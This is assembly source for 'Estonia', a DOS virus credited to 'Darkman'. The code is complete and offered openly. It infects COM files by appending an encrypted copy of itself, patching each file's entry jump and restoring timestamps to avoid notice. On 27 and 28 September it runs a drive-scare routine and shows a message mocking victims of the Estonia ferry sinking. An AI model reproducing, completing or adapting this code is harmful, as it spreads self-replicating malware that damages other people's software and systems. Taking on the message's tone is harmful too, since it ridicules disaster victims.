
;                      D   A   R   K   M   A   N
;                           Proudly Presents
;                      E   S   T   O   N   I   A

psp          equ     100h
virussize    equ     extracopy - code
cryptsize    equ     extracopy - crypted - 01h
dtaoffset    equ     02h * virussize + psp
filetime     equ     dtaoffset + 16h
filedate     equ     dtaoffset + 18h
filesize     equ     dtaoffset + 1ah
filename     equ     dtaoffset + 1eh
memsize      equ     dtaoffset + 2bh

estonia      segment
             assume  cs:estonia,ds:estonia,es:estonia
             org     100h                ; Origin of COM-file

code:
             call    viruscode
virusid      db      'ES'                ; Estonia Scan-ID

viruscode:
             pop     bp                  ; Load BP from stack
             sub     bp,offset virusid   ; BP = delta offset

             or      bp,bp               ; BP = 0?
             je      crypted             ; Equal? Jump to crypted
             std                         ; Set direction flag
             lea     bx,[bp+crypted]     ; AX = offset encrypted code
             mov     cx,02h              ; Transpose 2 times
             mov     dx,cryptsize        ; Decrypt 350 bytes
denexttime:
             push    cx                  ; Save CX at stack
             mov     cx,dx               ; CX = size of encrypted code
             mov     di,bx
             add     di,dx               ; DI = offset of last encrypted code
             mov     si,di               ; SI = offset of last encrypted code
             lodsb                       ; Load last plain byte
             sub     [bx],al             ; Subtract AL from first encrypt byte
denextbyte:
             lodsw                       ; Load 2 encrypted bytes
             sub     ah,al               ; Subtract AL from AH
             mov     al,ah               ; AL = decrypted byte
             stosb                       ; Store a decrypted byte
             inc     si                  ; Increase SI
             loop    denextbyte
             pop     cx                  ; Load CX from stack
             loop    denexttime
crypted:
             cld                         ; Clear direction flag
             mov     ah,2ah              ; Get system date
             int     21h                 ; Do it!
             cmp     dx,091bh            ; 27. September?
             jb      dontsink            ; Below? Jump to dontsink
             cmp     dx,091ch            ; 28. September?
             ja      dontsink            ; Above? Jump to dontsink

             xor     al,al               ; Clear AL
             mov     cx,19h              ; Destroy drives A-Z
formattrack:
             push    cx                  ; Save CX at stack
             mov     ah,2                ; Read a track
             xor     cx,cx               ; Clear CX
             xor     dh,dh               ; Clear DH
             mov     dl,al
             int     13h                 ; Do it! (disk)
             inc     al                  ; Increase AL
             pop     cx                  ; Load CX from stack
             loop    formattrack

             mov     ah,09h              ; Standard output string
             lea     dx,message          ; DX = offset of message
             int     21h                 ; Do it!
             
             int     20h                 ; Exit to DOS!
dontsink:
             mov     ah,4ah              ; Modify memory allocation
             mov     bx,1000h            ; The new block size is 65535 bytes
             int     21h                 ; Do it!
             jc      virusexit           ; Error? Jump to vitusexit

             mov     ah,1ah              ; Set disk transfer address
             lea     dx,[bp+dtaoffset]   ; DX = offset of new DTA
             int     21h                 ; Do it!

             mov     ah,4eh              ; Find first matching file
             mov     cx,22h              ; File attribute hidden+archive
             lea     dx,[bp+filespec]    ; DX = offset of filespec
findnext:
             int     21h                 ; Do it!
             jnc     infect              ; No error? Jump to infect
virusexit:
             mov     ah,1ah              ; Set disk transfer address
             mov     dx,80h              ; DX = offset of default DTA
             int     21h                 ; Do it!

             mov     di,100h             ; DI = beginning of code
             lea     si,[bp+realcode]    ; SI = offset of realcode
             push    di                  ; Restore Instruction Pointer (IP)
             movsw                       ; Move the real code to the beginning
             movsw                       ;  "    "   "    "   "   "      "
             movsb                       ;  "    "   "    "   "   "      "
             ret                         ; Return!
setfileinfo:
             mov     cx,[bp+filetime]    ; CX = file time in DTA
             mov     dx,[bp+filedate]    ; DX = file date in DTA
             mov     ax,5701h            ; Set file data and time
             int     21h                 ; Do it!
closefile:
             mov     ah,3eh              ; Close file
             int     21h                 ; Do it!
             mov     ah,4fh              ; Find next matching file
             jmp     short findnext
infect:
             mov     cx,virussize        ; Move 400 bytes
             lea     di,[bp+extracopy]   ; DI = offset of extracopy
             lea     si,[bp+code]        ; SI = offset of code
             rep     movsb               ; Create an extra copy of virus

             mov     ax,3d02h            ; Open file (read/write)
             lea     dx,[bp+filename]    ; DX = offset of filename in DTA
             int     21h                 ; Do it!
             jc      closefile           ; Error? Jump to closefile
             xchg    ax,bx               ; Exchange AX with BX

             mov     ax,word ptr [bp+filesize]
             cmp     ax,05h              ; AX = 5? (AX < 5)
             jb      closefile           ; Less? Jump to closefile
             cmp     ax,(65535-memsize)  ; AX = 64432? (AX > 64432)
             ja      closefile           ; Greater? Jump to closefile

             sub     ax,03h              ; AX = offset of virus code
             mov     [bp+offset estoniacode+01h],ax

             mov     ah,3fh              ; Read from file
             mov     cx,05h              ; Read 5 bytes
             lea     dx,[bp+virussize+realcode]
             int     21h                 ; Do it!

             cmp     [bp+virussize+offset realcode+03h],'SE'
             je      closefile           ; Infected? Jump to closefile

             lea     di,[bp+virussize+cryptvalues]
             in      ax,40h              ; AX = port 40h
             stosw                       ; Store AX in crypt values
             in      ax,40h              ; AX = port 40h
             stosw                       ; Store AX in crypt value

             push    bx                  ; Save BX at stack
             lea     bx,[bp+virussize+crypted]
             mov     cx,02h              ; Transpose 2 times
             mov     dx,cryptsize        ; Encrypt 350 bytes
ennexttime:
             push    cx                  ; Save CX at stack
             mov     cx,dx               ; CX = size of plain code
             mov     di,bx               ; DI = offset of plain code
             mov     si,bx               ; SI = offset of plain code
             inc     di                  ; Increase DI
ennextbyte:
             lodsw                       ; Load 2 plain bytes
             add     al,ah               ; Add AH to AL
             stosb                       ; Store a encrypted byte
             dec     si                  ; Decrease SI
             loop    ennextbyte
             add     [bx],al             ; Add AL to plain byte
             pop     cx                  ; Load CX from stack
             loop    ennexttime
             pop     bx                  ; Load BX from stack

             mov     ax,4202h            ; Move file pointer to the end
             xor     cx,cx               ; Clear CX
             cwd                         ; Convert word to doubleword
             int     21h                 ; Do it!

             mov     ah,40h              ; Write to file
             mov     cx,virussize        ; Write 400 bytes
             lea     dx,[bp+extracopy]   ; DX = offset of extracopy
             int     21h                 ; Do it!
             cmp     ax,cx               ; Disk full?
             jne     infectdone          ; Error? Jump to infectdone

             mov     ax,4200h            ; Move file pointer to the beginning
             xor     cx,cx               ; Clear CX
             cwd                         ; Convert word to doubleword
             int     21h                 ; Do it!

             mov     ah,40h              ; Write to file
             mov     cx,05h              ; Write 5 bytes
             lea     dx,[bp+estoniacode] ; DX = offset of estoniacode
             int     21h                 ; Do it!
infectdone:
             jmp     setfileinfo

cryptvalues  db      04h dup(?)          ; Cryption values
estoniacode  db      0e8h,00h,00h,'ES'   ; New code of infected file
realcode     db      0cdh,20h            ; Real code of infected file
             db      03h dup(?)
filespec     db      '*.COM',00h         ; File specification
message      db      'Your drives were ' ; This message will be shown the
             db      'on the Estonia...' ; 27 / 28. September and then the
             db      ' They DIDN''T sur' ; drives (A-Z) bootsector will
             db      'vive!!!',0dh,0ah   ; look like it is being destroyed!!!
             db      '$'
extracopy:

estonia      ends
end          code
